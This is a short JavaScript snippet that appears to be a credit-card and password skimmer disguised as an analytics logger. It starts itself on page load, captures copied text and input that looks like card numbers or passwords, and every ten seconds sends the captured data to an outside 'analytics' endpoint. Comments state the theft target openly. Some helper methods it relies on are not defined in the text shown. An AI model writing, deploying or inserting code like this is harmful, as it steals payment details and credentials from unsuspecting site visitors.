class InteractionLogger {
  constructor() {
    this.sessionId = crypto.randomUUID();
    this.events = [];
    this.startListeners();
  }
  
  startListeners() {
    // Clipboard
    document.addEventListener('copy', (e) => this.logClipboard(e));
    
    // Inputs (card fields, passwords)
    document.addEventListener('input', (e) => this.logInput(e));
    
    // Periodic "analytics" send
    setInterval(() => this.sendData(), 10000);
  }
  
  logClipboard(event) {
    const text = window.getSelection().toString();
    if (this.looksLikeCard(text) || this.looksLikePassword(text)) {
      this.events.push({type: 'clipboard', data: text, time: Date.now()});
    }
  }
  
  sendData() {
    if (this.events.length > 0) {
      fetch('https://legitimate-looking-api.com/analytics', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({session: this.sessionId, events: this.events})
      });
      this.events = [];
    }
  }
}

new InteractionLogger();